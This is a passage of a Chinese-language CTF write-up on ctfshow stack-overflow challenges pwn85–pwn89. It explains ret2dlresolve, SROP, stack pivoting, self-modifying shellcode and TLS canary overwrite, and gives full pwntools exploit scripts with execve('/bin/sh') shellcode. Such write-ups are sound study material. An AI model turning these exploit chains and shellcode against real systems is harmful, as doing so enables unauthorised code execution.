class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28191&quot;)</span><br><span class="line">p = process(&quot;../pwn85&quot;)</span><br><span class="line">rop = ROP(&quot;../pwn85&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn85&quot;)</span><br><span class="line"></span><br><span class="line"># 定义变量和函数</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu_front_addr = 0x400780</span><br><span class="line">csu_end_addr = 0x40079a</span><br><span class="line">vuln_addr = 0x400637</span><br><span class="line"></span><br><span class="line">def csu(rbx,rbp,r12,r13,r14,r15):</span><br><span class="line">	# 先执行gadget2</span><br><span class="line">	# rbx = 0，以正确的执行call指令</span><br><span class="line">	# rbp = 1，以通过jnz的判断跳出循环</span><br><span class="line">	# r12为要执行的函数地址</span><br><span class="line">	# r13,r14,r15就是要执行的函数的参数</span><br><span class="line">	payload = p64(csu_end_addr)</span><br><span class="line">	payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">	payload += p64(csu_front_addr)</span><br><span class="line">	# 六个pop是0x30，还有一个add rsp,8，所以是0x38</span><br><span class="line">	payload += 0x38 * b&#x27;\x00&#x27;</span><br><span class="line">	return payload</span><br><span class="line"></span><br><span class="line"># resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, &quot;system&quot;,elf.got[&quot;write&quot;])</span><br><span class="line">def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):</span><br><span class="line">	plt0 = elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addr</span><br><span class="line">	</span><br><span class="line">	rel_plt = elf.get_section_by_name(&#x27;.rela.plt&#x27;).header.sh_addr</span><br><span class="line">	relaent = elf.dynamic_value_by_tag(&#x27;DT_RELAENT&#x27;)</span><br><span class="line">	</span><br><span class="line">	dynsym = elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addr</span><br><span class="line">	syment = elf.dynamic_value_by_tag(&#x27;DT_SYMENT&#x27;)</span><br><span class="line">	</span><br><span class="line">	dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addr</span><br><span class="line">	</span><br><span class="line">	# 构造.dynstr</span><br><span class="line">	func_string_addr = store_addr</span><br><span class="line">	resolve_data = func_name.encode(&#x27;utf-8&#x27;) + b&#x27;\x00&#x27;</span><br><span class="line">	</span><br><span class="line">	# 构造.dynsym</span><br><span class="line">	</span><br><span class="line">	symbol_addr = store_addr + len(resolve_data)</span><br><span class="line">	offset = symbol_addr - dynsym</span><br><span class="line">	pad = syment - offset % syment</span><br><span class="line">	symbol_addr = symbol_addr + pad</span><br><span class="line">	# 计算偏移伪造数据</span><br><span class="line">	symbol = p32(func_string_addr - dynstr) + p8(0x12) + p8(0) + p16(0) + p64(0) + p64(0)</span><br><span class="line">	symbol_index = (symbol_addr - dynsym) // 24</span><br><span class="line">	resolve_data += b&#x27;\x00&#x27;* pad</span><br><span class="line">	resolve_data += symbol</span><br><span class="line">	</span><br><span class="line">	# 构造.rela.plt</span><br><span class="line">	</span><br><span class="line">	reloc_addr = store_addr + len(resolve_data)</span><br><span class="line">	offset = reloc_addr - rel_plt</span><br><span class="line">	pad = relaent - offset % relaent</span><br><span class="line">	reloc_addr += pad</span><br><span class="line">	reloc_index = (reloc_addr - rel_plt) // 24</span><br><span class="line">	r_info = (symbol_index &lt;&lt; 32) | 7</span><br><span class="line">	write_reloc = p64(resolve_addr) + p64(r_info) + p64(0)</span><br><span class="line">	resolve_data += b&#x27;\x00&#x27; * pad</span><br><span class="line">	resolve_data += write_reloc</span><br><span class="line">	</span><br><span class="line">	resolve_call = p64(plt0) + p64(reloc_index)</span><br><span class="line">	return resolve_data, resolve_call</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Welcome to CTFshowPWN!\n&quot;)</span><br><span class="line"></span><br><span class="line">store_addr = bss_addr + 0x100</span><br><span class="line">sh = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line"></span><br><span class="line"># 在store_addr读取要执行的payload</span><br><span class="line"></span><br><span class="line">rop = ROP(&#x27;../pwn85&#x27;)</span><br><span class="line">offset = 0x70 + 0x8</span><br><span class="line">rop.raw(offset*b&#x27;\x00&#x27;)</span><br><span class="line">resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, &quot;system&quot;,elf.got[&quot;write&quot;])</span><br><span class="line"># 此处进行了修改</span><br><span class="line">rop.raw(csu(0,1,elf.got[&#x27;read&#x27;],0,store_addr,len(resolve_data)+len(sh)))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(b&#x27;\x00&#x27; * (0x100 - len(rop.chain())))</span><br><span class="line">assert(len(rop.chain())&lt;=0x100)</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.send(resolve_data+sh)</span><br><span class="line">bin_sh_addr = store_addr + len(resolve_data)</span><br><span class="line"></span><br><span class="line"># 读取system函数的参数</span><br><span class="line"></span><br><span class="line">#rop = ROP(&#x27;../pwn85&#x27;)</span><br><span class="line">#rop.raw(cyclic(offset))</span><br><span class="line">#sh = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">#bin_sh_addr = store_addr + len(resolve_data)</span><br><span class="line">#rop.raw(csu(0,1,elf.got[&#x27;read&#x27;],0,bin_sh_addr,len(sh)))</span><br><span class="line">#rop.raw(vuln_addr)</span><br><span class="line">#rop.raw(&#x27;a&#x27;*(0x100-len(rop.chain())))</span><br><span class="line">#p.send(rop.chain())</span><br><span class="line">#p.send(sh)</span><br><span class="line"></span><br><span class="line"># 泄露地址</span><br><span class="line">rop = ROP(&quot;../pwn85&quot;)</span><br><span class="line">rop.raw(offset*b&#x27;\x00&#x27;)</span><br><span class="line">rop.raw(csu(0, 1 ,elf.got[&#x27;write&#x27;],1,0x601008,8))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(b&quot;\x00&quot;*(256-len(rop.chain())))</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">link_map_addr = u64(p.recv(8))</span><br><span class="line">print(hex(link_map_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span><br><span class="line">rop = ROP(&quot;../pwn85&quot;)</span><br><span class="line">rop.raw(offset*&#x27;\x00&#x27;)</span><br><span class="line">rop.raw(csu(0, 1 ,elf.got[&#x27;read&#x27;],0,link_map_addr+0x1c8,8))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(b&quot;\x00&quot;*(256-len(rop.chain())))</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.send(p64(0))</span><br><span class="line"></span><br><span class="line"># 栈迁移</span><br><span class="line">rop = ROP(&#x27;../pwn85&#x27;)</span><br><span class="line">rop.raw(offset * &#x27;\x00&#x27;)</span><br><span class="line">rop.raw(0x4007a3)</span><br><span class="line">rop.raw(bin_sh_addr)</span><br><span class="line">rop.raw(resolve_call)</span><br><span class="line">#rop.raw(b&#x27;a&#x27;*(0x100-len(rop.chain())))</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>确实不知道怎么写，只能顺着代码过一遍思路</p>
<h5 id="DT-SYMENT-DT-RELAENT知识补充"><a href="#DT-SYMENT-DT-RELAENT知识补充" class="headerlink" title="DT_SYMENT &amp; DT_RELAENT知识补充"></a>DT_SYMENT &amp; DT_RELAENT知识补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">在 ELF 文件格式中，`.dynamic` 段用于存储动态链接器在运行时所需的各种信息。这些信息由一系列 `Elf32_Dyn` 或 `Elf64_Dyn` 结构体（取决于 32 位还是 64 位架构）表示。每个 `Elf32_Dyn` 或 `Elf64_Dyn` 结构体包含一个标记（`d_tag`）和一个值（`d_val` 或 `d_ptr`），表示动态链接所需的各种信息和表的地址。</span><br><span class="line"></span><br><span class="line">DT_SYMENT</span><br><span class="line"></span><br><span class="line">- DT_SYMENT 是 `.dynamic` 段中的一个标记，用于指示 `.dynsym` 表中每个符号表项（`Elf32_Sym` 或 `Elf64_Sym`）的大小。</span><br><span class="line"></span><br><span class="line">- 用途：动态链接器需要知道符号表中每个符号的大小，以便在 `.dynsym` 段中正确地解析符号。</span><br><span class="line"></span><br><span class="line">- 值：`DT_SYMENT` 的值通常是一个常量，表示符号表项的大小。对于 32 位 ELF 文件，`DT_SYMENT` 的值通常为 16 字节（`sizeof(Elf32_Sym)`），而对于 64 位 ELF 文件，`DT_SYMENT` 的值通常为 24 字节（`sizeof(Elf64_Sym)`）。</span><br><span class="line"></span><br><span class="line">DT_RELAENT</span><br><span class="line"></span><br><span class="line">- DT_RELAENT 是 `.dynamic` 段中的另一个标记，用于指示重定位表项（`Elf32_Rela` 或 `Elf64_Rela`）的大小。</span><br><span class="line"></span><br><span class="line">- 用途：动态链接器需要知道重定位表项的大小，以便在 `.rela` 或 `.rela.plt` 段中正确地处理每个重定位条目。</span><br><span class="line"></span><br><span class="line">- 值：`DT_RELAENT` 的值通常是一个常量，表示重定位表项的大小。对于 32 位 ELF 文件，`DT_RELAENT` 的值通常为 12 字节（`sizeof(Elf32_Rela)`），而对于 64 位 ELF 文件，`DT_RELAENT` 的值通常为 24 字节（`sizeof(Elf64_Rela)`）。</span><br><span class="line"></span><br><span class="line">总结</span><br><span class="line"></span><br><span class="line">- DT_SYMENT：符号表项大小的常量，告诉动态链接器在 `.dynsym` 段中如何解析每个符号表项。</span><br><span class="line"></span><br><span class="line">- DT_RELAENT：重定位表项大小的常量，告诉动态链接器在 `.rela` 或 `.rela.plt` 段中如何处理每个重定位条目。</span><br><span class="line"></span><br><span class="line">这两个条目都是为了让动态链接器能够正确解析和处理 ELF 文件中的符号和重定位条目。</span><br></pre></td></tr></table></figure>



<h4 id="pwn86"><a href="#pwn86" class="headerlink" title="pwn86"></a>pwn86</h4><p>SROP，没看论文，感觉论文好长，看ctfwiki里面的解释，感觉也不是特别难。</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240902092431521.png" alt="image-20240902092431521"></p>
<p>ucontext和siginfo合在一起叫做signal frame</p>
<p>x86架构(32bit) signal frame</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">struct sigcontext</span><br><span class="line">&#123;</span><br><span class="line">  unsigned short gs, __gsh;</span><br><span class="line">  unsigned short fs, __fsh;</span><br><span class="line">  unsigned short es, __esh;</span><br><span class="line">  unsigned short ds, __dsh;</span><br><span class="line">  unsigned long edi;</span><br><span class="line">  unsigned long esi;</span><br><span class="line">  unsigned long ebp;</span><br><span class="line">  unsigned long esp;</span><br><span class="line">  unsigned long ebx;</span><br><span class="line">  unsigned long edx;</span><br><span class="line">  unsigned long ecx;</span><br><span class="line">  unsigned long eax;</span><br><span class="line">  unsigned long trapno;</span><br><span class="line">  unsigned long err;</span><br><span class="line">  unsigned long eip;</span><br><span class="line">  unsigned short cs, __csh;</span><br><span class="line">  unsigned long eflags;</span><br><span class="line">  unsigned long esp_at_signal;</span><br><span class="line">  unsigned short ss, __ssh;</span><br><span class="line">  struct _fpstate * fpstate;</span><br><span class="line">  unsigned long oldmask;</span><br><span class="line">  unsigned long cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>x64架构(64bit) signal frame</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">struct _fpstate</span><br><span class="line">&#123;</span><br><span class="line">  /* FPU environment matching the 64-bit FXSAVE layout.  */</span><br><span class="line">  __uint16_t        cwd;</span><br><span class="line">  __uint16_t        swd;</span><br><span class="line">  __uint16_t        ftw;</span><br><span class="line">  __uint16_t        fop;</span><br><span class="line">  __uint64_t        rip;</span><br><span class="line">  __uint64_t        rdp;</span><br><span class="line">  __uint32_t        mxcsr;</span><br><span class="line">  __uint32_t        mxcr_mask;</span><br><span class="line">  struct _fpxreg    _st[8];</span><br><span class="line">  struct _xmmreg    _xmm[16];</span><br><span class="line">  __uint32_t        padding[24];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct sigcontext</span><br><span class="line">&#123;</span><br><span class="line">  __uint64_t r8;</span><br><span class="line">  __uint64_t r9;</span><br><span class="line">  __uint64_t r10;</span><br><span class="line">  __uint64_t r11;</span><br><span class="line">  __uint64_t r12;</span><br><span class="line">  __uint64_t r13;</span><br><span class="line">  __uint64_t r14;</span><br><span class="line">  __uint64_t r15;</span><br><span class="line">  __uint64_t rdi;</span><br><span class="line">  __uint64_t rsi;</span><br><span class="line">  __uint64_t rbp;</span><br><span class="line">  __uint64_t rbx;</span><br><span class="line">  __uint64_t rdx;</span><br><span class="line">  __uint64_t rax;</span><br><span class="line">  __uint64_t rcx;</span><br><span class="line">  __uint64_t rsp;</span><br><span class="line">  __uint64_t rip;</span><br><span class="line">  __uint64_t eflags;</span><br><span class="line">  unsigned short cs;</span><br><span class="line">  unsigned short gs;</span><br><span class="line">  unsigned short fs;</span><br><span class="line">  unsigned short __pad0;</span><br><span class="line">  __uint64_t err;</span><br><span class="line">  __uint64_t trapno;</span><br><span class="line">  __uint64_t oldmask;</span><br><span class="line">  __uint64_t cr2;</span><br><span class="line">  __extension__ union</span><br><span class="line">    &#123;</span><br><span class="line">      struct _fpstate * fpstate;</span><br><span class="line">      __uint64_t __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  __uint64_t __reserved1 [8];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240902105256458.png" alt="image-20240902105256458"></p>
<p>由于signal frame是存储在用户的栈空间的，如果存在栈溢出的话可能可以控制。</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240902093401628.png" alt="image-20240902093401628"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240902103114199.png" alt="image-20240902103114199"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240902102829789.png" alt="image-20240902102829789"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240902104950568.png" alt="image-20240902104950568"></p>
<p>反编译的代码很简单，sys_write输出欢迎语，sys_read读入global_buf，然后调用sigreturn函数，global_buf就是读入的栈帧(signal frame)。0xf8就是x64架构的signal frame长度。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn86&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28305&quot;)</span><br><span class="line">#p = process(&#x27;../pwn86&#x27;)</span><br><span class="line">bin_sh_offset = 0x100</span><br><span class="line"></span><br><span class="line">signal_frame = SigreturnFrame()</span><br><span class="line">signal_frame.rax = constants.SYS_execve</span><br><span class="line">signal_frame.rdi = elf.sym[&#x27;global_buf&#x27;] + bin_sh_offset</span><br><span class="line">signal_frame.rsi = 0</span><br><span class="line">signal_frame.rdx = 0</span><br><span class="line">signal_frame.rip = elf.sym[&#x27;syscall&#x27;]</span><br><span class="line">print(signal_frame)</span><br><span class="line">#p.send(signal_frame + (bin_sh_offset - len(signal_frame)) * b&#x27;a&#x27; + b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">p.send(bytes(signal_frame).ljust(bin_sh_offset,b&#x27;a&#x27;) + b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>需要将python2的代码转为python3的代码，原理还是挺好理解的</p>
<h4 id="pwn87"><a href="#pwn87" class="headerlink" title="pwn87"></a>pwn87</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240902120441679.png" alt="image-20240902120441679"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240902120536113.png" alt="image-20240902120536113"></p>
<p>漏洞函数</p>
<p>fgets函数存在栈溢出，但是只能溢出一点(50 - 0x20 - 0x4 &#x3D; 14Byte)</p>
<p>14个字节，能写什么吗，难道要打one_gadget或者ret2syscall吗</p>
<p>所以此处使用栈迁移将栈迁移到s的位置，因为s是可以控制的</p>
<p>1、利用栈溢出布置shellcode</p>
<p>2、控制eip指向shellcode</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240902165139066.png" alt="image-20240902165139066"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;../pwn87&#x27;)</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn87&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode_x86 = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span><br><span class="line">shellcode_x86 += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span><br><span class="line">shellcode_x86 += &quot;\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">sub_esp_jmp = asm(&#x27;sub esp, 0x28;jmp esp&#x27;)</span><br><span class="line">jmp_esp = 0x08048d17</span><br><span class="line">payload = shellcode_x86 + (</span><br><span class="line">    0x20 - len(shellcode_x86)) * &#x27;b&#x27; + &#x27;bbbb&#x27; + p32(jmp_esp) + sub_esp_jmp</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>试了一下把jmp_esp换成ret，发现不行啊，ret指向的是地址内存储的值，而不是地址本身。</p>
<p>此处还是应该用jmp esp</p>
<h4 id="pwn88"><a href="#pwn88" class="headerlink" title="pwn88"></a>pwn88</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240902172951476.png" alt="image-20240902172951476"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240902205730439.png" alt="image-20240902205730439"></p>
<p>读入一个v6[0] 和v4，然后在v6[0]对应的地址处写入v4的值</p>
<p>也就是说一次可以读入一个字节的值，但是如何多次写入呢？</p>
<p>这里可以对条件判断语句进行覆盖，调整为指向函数起始的语句</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903003252979.png" alt="image-20240903003252979"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903003259335.png" alt="image-20240903003259335"></p>
<p>经过writeData(text+1,u32(asm(‘jnz $-0x4A’)[1:].ljust(4,b’\x00’)))修改后的0x400768</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;../pwn88&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn88&#x27;,&#x27;b main&#x27;)</span><br><span class="line">#p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27;28144&#x27;)</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn88&#x27;)</span><br><span class="line"></span><br><span class="line">text = 0x400767</span><br><span class="line"></span><br><span class="line">def writeData(addr,data):</span><br><span class="line">	p.sendlineafter(&#x27;Where What?&#x27;,f&#x27;&#123;hex(addr)&#125; &#123;data&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"># 其实就是每次只修改一个字节的值，所以要保证其他的字节是相同的值，按照这样的思路，选择了和原来相同的指令jnz，然后再修改为jmp，再在最后要执行的时候修改偏移值</span><br><span class="line"># 补全到4个字节应该是方便u32转换字节为整数</span><br><span class="line">writeData(text+1,u32(asm(&#x27;jnz $-0x4A&#x27;)[1:].ljust(4,b&#x27;\x00&#x27;)))</span><br><span class="line">#print(asm(&#x27;jnz $-0x4A&#x27;))</span><br><span class="line">#print(asm(&#x27;jnz $-0x4A&#x27;)[1:])</span><br><span class="line">writeData(text,u32(asm(&#x27;jmp $-0x4A&#x27;)[0:1].ljust(4,b&#x27;\x00&#x27;)))</span><br><span class="line">#print(asm(&#x27;jmp $-0x4A&#x27;))</span><br><span class="line">#print(asm(&#x27;jmp $-0x4A&#x27;)[0:1])</span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;mov rax,0x0068732f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi,rsp</span><br><span class="line">mov rax,59</span><br><span class="line">xor rsi,rsi</span><br><span class="line">mov rdx,rdx</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode_addr = 0x400769</span><br><span class="line">i = 0</span><br><span class="line"># 这里可以打一个print，然后就会发现所有的data都是整数形式的，可能是for循环的时候转换了，转为了单个字节的整数形式</span><br><span class="line">for x in shellcode:</span><br><span class="line">	data = x</span><br><span class="line">	writeData(shellcode_addr + i,data)</span><br><span class="line">	i = i + 1</span><br><span class="line">writeData(text+1,u32(asm(&#x27;jnz $+0x2&#x27;)[1:].ljust(4,b&#x27;\x00&#x27;)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn89"><a href="#pwn89" class="headerlink" title="pwn89"></a>pwn89</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903111343071.png" alt="image-20240903111343071"></p>
<p>开启了canary</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903112110651.png" alt="image-20240903112110651"></p>
<p>pthread_create创建了一个进程，以start为运行函数，其实按我的理解就是调用了start函数<br>pthread_join用于等待进程的结束</p>
<p>跟进start函数</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903112249798.png" alt="image-20240903112249798"></p>
<p>大部分都是输出或者判断，比较可疑的点只有lenth()和readn()，因此跟进lenth()</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903112351038.png" alt="image-20240903112351038"></p>
<p>fgets不存在溢出，atol会将字符串转为整数（比如说将”250”转成250，但是如果是”sb”的话就会转成0），start函数中的v2就是atol返回的整数</p>
<p>如果v2&lt;&#x3D;0x10000的话就会进入readn函数，参数为(0,s,v2)，跟进readn()</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903112740129.png" alt="image-20240903112740129"></p>
<p>此时a1 &#x3D; 0，a2 &#x3D; s，a3 &#x3D; v2，s是start中被memset为0的字符串，然后再转64位整数</p>
<p>进入while循环，由于刚开始v5是小于a3的，所以必定是可以成功进入循环的。进入循环后先执行read函数，a1&#x3D;0，v5+a2就是a2，而读入的字节数是可以控制的，如果a3-v5比0x1010+0x8大的话就存在溢出点了。</p>
<p>最大的问题在于，如何绕过canary呢？</p>
<p><a target="_blank" rel="noopener" href="https://eternalsakura13.com/2018/04/24/starctf_babystack/">https://eternalsakura13.com/2018/04/24/starctf_babystack/</a></p>
<p><a target="_blank" rel="noopener" href="https://kiprey.github.io/2022/08/thread_canary/">https://kiprey.github.io/2022/08/thread_canary/</a></p>
<p><a target="_blank" rel="noopener" href="http://liupzmin.com/2019/09/30/concurrence/tls-summary/">http://liupzmin.com/2019/09/30/concurrence/tls-summary/</a></p>
<p>根据这些文章可以得知，在线程的初始化中使用了TLS技术，会将canary存储在tcbhead_t中，而TCB又存储在线程栈的高位地址处，如果栈溢出得够多的话就能修改存储在TCB中的canary（这就是这道题最大的难点也是知识点）</p>
<p>利用方法：溢出后泄露puts地址，计算出libc的基址后使用one_gadget去getshell</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903154306151.png" alt="image-20240903154306151"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903154327291.png" alt="image-20240903154327291"></p>
